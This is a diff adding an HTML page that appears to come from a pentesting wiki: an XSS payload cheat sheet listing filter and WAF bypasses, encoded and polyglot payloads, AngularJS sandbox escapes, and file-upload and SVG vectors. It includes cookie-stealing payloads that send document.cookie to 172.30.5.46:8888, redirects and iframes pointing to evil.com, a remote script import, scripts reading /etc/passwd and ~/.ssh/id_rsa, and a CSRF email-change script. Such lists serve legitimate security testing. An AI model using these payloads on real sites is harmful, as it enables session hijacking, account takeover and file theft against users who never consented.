+&lt;script&gt;Function`X${document.location.hash.substr`1`}```&lt;/script&gt;
+
+# Angle brackets HTML encoded (in an attribute)
+“onmouseover=“alert(1)
+‘-alert(1)-’
+
+# If quote is escaped
+‘}alert(1);{‘
+‘}alert(1)%0A{‘
+\’}alert(1);{//
+
+# Embedded tab, newline, carriage return to break up XSS
+&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"&gt;
+&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"&gt;
+&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"&gt;
+
+# RegEx bypass
+&lt;img src="X" onerror=top[8680439..toString(30)](1337)&gt;
+
+# Other
+&lt;svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))&gt;: base64 value which is alert(‘XSS’)
+</code></pre>
+<h3 id="encoded"><a class="header" href="#encoded">Encoded</a></h3>
+<pre><code class="language-markup"># Unicode
+&lt;script&gt;\u0061lert(1)&lt;/script&gt;
+&lt;script&gt;\u{61}lert(1)&lt;/script&gt;
+&lt;script&gt;\u{0000000061}lert(1)&lt;/script&gt;
+
+# Hex
+&lt;script&gt;eval('\x61lert(1)')&lt;/script&gt;
+
+# HTML
+&lt;svg&gt;&lt;script&gt;&amp;#97;lert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;script&gt;&amp;#x61;lert(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;script&gt;alert&amp;NewLine;(1)&lt;/script&gt;&lt;/svg&gt;
+&lt;svg&gt;&lt;script&gt;x="&amp;quot;,alert(1)//";&lt;/script&gt;&lt;/svg&gt;
+\’-alert(1)//
+
+# URL
+&lt;a href="javascript:x='%27-alert(1)-%27';"&gt;XSS&lt;/a&gt;
+
+# Double URL Encode
+%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
+
+# Unicode + HTML
+&lt;svg&gt;&lt;script&gt;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x31;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x63;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x36;&amp;#x35;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x32;&amp;#x5c;&amp;#x75;&amp;#x30;&amp;#x30;&amp;#x37;&amp;#x34;(1)&lt;/script&gt;&lt;/svg&gt;
+
+# HTML + URL
+&lt;iframe src="javascript:'&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&amp;#x25;&amp;#x33;&amp;#x43;&amp;#x25;&amp;#x32;&amp;#x46;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x25;&amp;#x33;&amp;#x45;'"&gt;&lt;/iframe&gt;
+</code></pre>
+<h3 id="polyglots"><a class="header" href="#polyglots">Polyglots</a></h3>
+<pre><code class="language-markup">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+--&gt;'"/&gt;&lt;/sCript&gt;&lt;deTailS open x="&gt;" ontoggle=(co\u006efirm)``&gt;
+oNcliCk=alert(1)%20)//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;%5Cx3csVg/&lt;img/src/onerror=alert(2)&gt;%5Cx3e
+javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'&gt;
+javascript:alert();//&lt;img src=x:x onerror=alert(1)&gt;\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/select&gt;&lt;/script&gt;&lt;frame src=javascript:alert()&gt;&lt;svg onload=alert()&gt;&lt;!--
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;
+"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;" &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar; 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;img src="http: //i.imgur.com/P8mL8.jpg"&gt; 
+￼￼```
+%3C!%27/!%22/!\%27/\%22/ — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm1%20//%3E#
+&lt;!'/!”/!\'/\"/ — !&gt;&lt;/Title/&lt;/script/&gt;&lt;Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm1 //&gt;#
+jaVasCript:/-//*\/'/"/*/(/ */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/ — !&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+"&gt;&gt;
+” &gt;&lt;/plaintext&gt;&lt;/|&gt;&lt;plaintext/onmouseover=prompt(1) &gt;prompt(1)@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;’ →” &gt; "&gt;&lt;/script&gt;alert(1)”&gt;&lt;img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;"&gt;
+" onclick=alert(1)//&lt;button ' onclick=alert(1)//&gt; */ alert(1)//
+?msg=&lt;img/src=`%00`%20onerror=this.onerror=confirm(1)
+&lt;svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))&gt;
+&lt;sVg/oNloAd=”JaVaScRiPt:/**\/*\’/”\eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))”&gt; &lt;iframe src=jaVaScrIpT:eval(atob(‘Y29uZmlybShkb2N1bWVudC5kb21haW4pOw==’))&gt;
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+'"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;"&gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouse over=prompt(1)&gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;"&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar;1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;imgsrc="http://i.imgur.com/P8mL8.jpg"&gt;
+
+# No parenthesis, back ticks, brackets, quotes, braces
+a=1337,b=confirm,c=window,c.onerror=b;throw-a
+
+# Another uncommon
+'-(a=alert,b="_Y000!_",[b].find(a))-'
+
+# Common XSS in HTML Injection
+&lt;svg onload=alert(1)&gt;
+&lt;/tag&gt;&lt;svg onload=alert(1)&gt;
+"&gt;&lt;/tag&gt;&lt;svg onload=alert(1)&gt;
+'onload=alert(1)&gt;&lt;svg/1='
+'&gt;alert(1)&lt;/script&gt;&lt;script/1='
+*/alert(1)&lt;/script&gt;&lt;script&gt;/*
+*/alert(1)"&gt;'onload="/*&lt;svg/1='
+`-alert(1)"&gt;'onload="`&lt;svg/1='
+*/&lt;/script&gt;'&gt;alert(1)/*&lt;script/1='
+p=&lt;svg/1='&amp;q='onload=alert(1)&gt;
+p=&lt;svg 1='&amp;q='onload='/*&amp;r=*/alert(1)'&gt;
+q=&lt;script/&amp;q=/src=data:&amp;q=alert(1)&gt;
+&lt;script src=data:,alert(1)&gt;
+# inline
+"onmouseover=alert(1) //
+"autofocus onfocus=alert(1) //
+# src attribute
+javascript:alert(1)
+# JS injection
+'-alert(1)-'
+'/alert(1)//
+\'/alert(1)//
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+/alert(1)//\
+/alert(1)}//\
+${alert(1)}
+
+# XSS onscroll
+&lt;p style=overflow:auto;font-size:999px onscroll=alert(1)&gt;AAA&lt;x/id=y&gt;&lt;/p&gt;#y
+
+# XSS filter bypasss polyglot:
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- &gt;&lt;/SCRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83)) &lt;/SCRIPT&gt;
+"&gt;&gt;&lt;marquee&gt;&lt;img src=x onerror=confirm(1)&gt;&lt;/marquee&gt;" &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;&lt;script&gt;prompt(1)&lt;/script&gt;@gmail.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;'--&gt;" &gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;&lt;img/id="confirm&amp;lpar; 1)"/alt="/"src="/"onerror=eval(id&amp;%23x29;&gt;'"&gt;&lt;img src="http: //i.imgur.com/P8mL8.jpg"&gt; 
+
+" &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); &lt;/script&gt;
+" &lt;script&gt; x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); &lt;/script&gt;
+
+# GO SSTI
+{{define "T1"}}&lt;script&gt;alert(1)&lt;/script&gt;{{end}} {{template "T1"}}`
+
+# Some XSS exploitations
+- host header injection through xss
+add referer: batman 
+hostheader: bing.com"&gt;script&gt;alert(document.domain)&lt;/script&gt;&lt;"
+- URL redirection through xss
+document.location.href="http://evil.com"
+- phishing through xss - iframe injection
+&lt;iframe src="http://evil.com" height="100" width="100"&gt;&lt;/iframe&gt;
+- Cookie stealing through xss
+https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
+https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
+&lt;script&gt;var i=new Image;i.src="http://172.30.5.46:8888/?"+document.cookie;&lt;/script&gt;
+&lt;img src=x onerror=this.src='http://172.30.5.46:8888/?'+document.cookie;&gt;
+&lt;img src=x onerror="this.src='http://172.30.5.46:8888/?'+document.cookie; this.removeAttribute('onerror');"&gt;
+-  file upload  through xss
+upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
+-  remote file inclusion (RFI) through xss
+php?=http://brutelogic.com.br/poc.svg - xsspayload
+- convert self xss to reflected one
+copy response in a file.html -&gt; it will work
+
+# XSS to SSRF
+&lt;esi:include src="http://yoursite.com/capture" /&gt;
+
+# XSS to LFI
+&lt;script&gt;	x=new XMLHttpRequest;	x.onload=function(){		document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();&lt;/script&gt;
+
+&lt;img src="xasdasdasd" onerror="document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;')"/&gt;
+&lt;script&gt;document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;');&lt;/scrip&gt;
+</code></pre>
+<h2 id="xss-in-files"><a class="header" href="#xss-in-files">XSS in files</a></h2>
+<pre><code class="language-markup"># XSS in filename:
+"&gt;&lt;img src=x onerror=alert(document.domain)&gt;.gif
+
+# XSS in metadata:
+exiftool -FIELD=XSS FILE
+exiftool -Artist=' "&gt;&lt;img src=1 onerror=alert(document.domain)&gt;' brute.jpeg
+exiftool -Artist='"&gt;&lt;script&gt;alert(1)&lt;/script&gt;' dapos.jpeg
+
+# XSS in GIF Magic Number:
+GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;
+# If image can't load:
+url.com/test.php?p=&lt;script src=http://url.com/upload/img/xss.gif&gt;
+
+# XSS in png:
+https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/
+
+# XSS in PDF:
+https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1
+
+# XSS upload filename:
+cp somefile.txt \"\&gt;\&lt;img\ src\ onerror=prompt\(1\)\&gt;
+&lt;img src=x onerror=alert('XSS')&gt;.png
+"&gt;&lt;img src=x onerror=alert('XSS')&gt;.png
+"&gt;&lt;svg onmouseover=alert(1)&gt;.svg
+&lt;&lt;script&gt;alert('xss')&lt;!--a--&gt;a.png
+"&gt;&lt;svg onload=alert(1)&gt;.gif
+
+# XSS Svg Image upload
+&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
+   &lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/&gt;
+   &lt;script type="text/javascript"&gt;
+      alert('XSS!');
+   &lt;/script&gt;
+&lt;/svg&gt;
+
+# XSS svg image upload 2
+# If you're testing a text editor on a system that you can also upload files to, try to oembed an svg:
+&lt;iframe src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/movingcart_1.svg" frameborder="0"&gt;&lt;/iframe&gt;
+#If that works, upload an SVG with the following content and try rendering it using the text editor:
+&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
+    &lt;script&gt;alert(document.domain)&lt;/script&gt;
+&lt;/svg&gt;
+
+# XSS in SVG 3:
+&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/&gt;
+
+# XSS in XML
+&lt;html&gt;
+&lt;head&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;something:script xmlns:something="http://www.w3.org/1999/xhtml"&gt;alert(1)&lt;/something:script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+# https://brutelogic.com.br/blog/file-upload-xss/
+
+" ="" '&gt;&lt;/&gt;&lt;script&gt;&lt;/script&gt;&lt;svg onload"="alertonload=alert(1)"" onload=setInterval'alert\x28document.domain\x29'
+
+# XSS in existent jpeg:
+exiftool -Artist='"&gt;&lt;svg onload=alert(1)&gt;' xss.jpeg
+
+# XSS in url (and put as header)
+http://acme.corp/?redir=[URI_SCHEME]://gremwell.com%0A%0A[XSS_PAYLOAD]
+
+# XSS in XML
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;html xmlns:html="http://w3.org/1999/xhtml"&gt;
+&lt;html:script&gt;prompt(document.domain);&lt;/html:script&gt;
+&lt;/html&gt;
+</code></pre>
+<h2 id="dom-xss"><a class="header" href="#dom-xss"><strong>DOM XSS</strong></a></h2>
+<pre><code class="language-markup">&lt;img src=1 onerror=alert(1)&gt;
+&lt;iframe src=javascript:alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;svg&gt;&lt;svg onload=alert(1)&gt;
+data:text/html,&lt;img src=1 onerror=alert(1)&gt;
+data:text/html,&lt;iframe src=javascript:alert(1)&gt;
+&lt;iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')"&gt;
+"&gt;&lt;svg onload=alert(1)&gt;
+javascript:alert(document.cookie)
+\"-alert(1)}//
+</code></pre>
+<h2 id="xss-to-csrf"><a class="header" href="#xss-to-csrf"><strong>XSS to CSRF</strong></a></h2>
+<pre><code class="language-markup"># Example:
+
+# Detect action to change email, with anti csrf token, get it and paste this in a comment to change user email:
+
+&lt;script&gt;
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/email',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/email/change-email', true);
+    changeReq.send('csrf='+token+'&amp;email=test@test.com')
+};
+&lt;/script&gt;
+</code></pre>
+<h2 id="angularjs-sandbox"><a class="header" href="#angularjs-sandbox"><strong>AngularJS Sandbox</strong></a></h2>
+<pre><code class="language-markup"># Removed in AngularJS 1.6
+# Is a way to avoid some strings like window, document or __proto__.
+
+# Without strings:
+/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+
+# With CSP:
+
+&lt;script&gt;
+location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+&lt;/script&gt;
+
+# v 1.6 and up
+{{$new.constructor('alert(1)')()}}
+&lt;x ng-app&gt;{{$new.constructor('alert(1)')()}}
+
+{{constructor.constructor('alert(1)')()}}
+{{constructor.constructor('import("https://six2dez.xss.ht")')()}}
+{{$on.constructor('alert(1)')()}}
+{{{}.")));alert(1)//"}}
+{{{}.")));alert(1)//"}}
+toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
+</code></pre>
+<h2 id="xss-in-js"><a class="header" href="#xss-in-js"><strong>XSS in JS</strong></a></h2>
+<pre><code class="language-markup"># Inside JS script:
+&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;
+&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Inside JS literal script:
+'-alert(document.domain)-'
+';alert(document.domain)//
+'-alert(1)-'
+
+# Inside JS that escape special chars:
+If ';alert(document.domain)// is converted in \';alert(document.domain)//
+Use \';alert(document.domain)// to obtain \\';alert(document.domain)//
+\'-alert(1)//
+
+# Inside JS with some char blocked:
+onerror=alert;throw 1
+/post?postId=5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
+
+# Inside {}
+${alert(document.domain)}
+${alert(1)}
+</code></pre>
+<h2 id="xss-waf-bypasses"><a class="header" href="#xss-waf-bypasses">XSS Waf Bypasses</a></h2>
+<pre><code class="language-markup"># Only lowercase block
+&lt;sCRipT&gt;alert(1)&lt;/sCRipT&gt;
+
+# Break regex
+&lt;script&gt;%0aalert(1)&lt;/script&gt;
+
+# Double encoding
+%2522
+
+# Recursive filters
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
+
+# Inject anchor tag
+&lt;a/href="j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;Tab;ri&amp;Tab;pt:alert&amp;lpar;1&amp;rpar;"&gt;
+
+# Bypass whitespaces
+&lt;svg·onload=alert(1)&gt;
+
+# Change GET to POST request
+
+# Imperva Incapsula
+%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
+&lt;img/src="x"/onerror="[JS-F**K Payload]"&gt;
+&lt;iframe/onload='this["src"]="javas&amp;Tab;cript:al"+"ert``"';&gt;&lt;img/src=q onerror='new Function`al\ert\`1\``'&gt;
+
+# WebKnight
+&lt;details ontoggle=alert(1)&gt;
+&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;
+
+# F5 Big IP
+&lt;body style="height:1000px" onwheel="[DATA]"&gt;
+&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[DATA]"&gt;
+&lt;body style="height:1000px" onwheel="[JS-F**k Payload]"&gt;
+&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[JS-F**k Payload]"&gt;
+&lt;body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"&gt;
+&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)"&gt;
+
+# Barracuda WAF
+&lt;body style="height:1000px" onwheel="alert(1)"&gt;
+&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;
+
+# PHP-IDS
+&lt;svg+onload=+"[DATA]"
+&lt;svg+onload=+"aler%25%37%34(1)"
+
+# Mod-Security
+&lt;a href="j[785 bytes of (&amp;NewLine;&amp;Tab;)]avascript:alert(1);"&gt;XSS&lt;/a&gt;
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;
+
+# Quick Defense:
+&lt;input type="search" onsearch="aler\u0074(1)"&gt;
+&lt;details ontoggle="aler\u0074(1)"&gt;
+
+# Sucuri WAF
+1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
+
+# Akamai
+1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
+&lt;SCr%00Ipt&gt;confirm(1)&lt;/scR%00ipt&gt;
+# AngularJS
+{{constructor.constructor(alert 1 )()}} 
+</code></pre>
+<h2 id="xss-mindmap"><a class="header" href="#xss-mindmap">XSS Mindmap</a></h2>
+<p><img src="../../.gitbook/assets/XSS2.png" alt="" /></p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../enumeration/web/open-redirects.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../enumeration/web/csp.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../enumeration/web/open-redirects.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../enumeration/web/csp.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
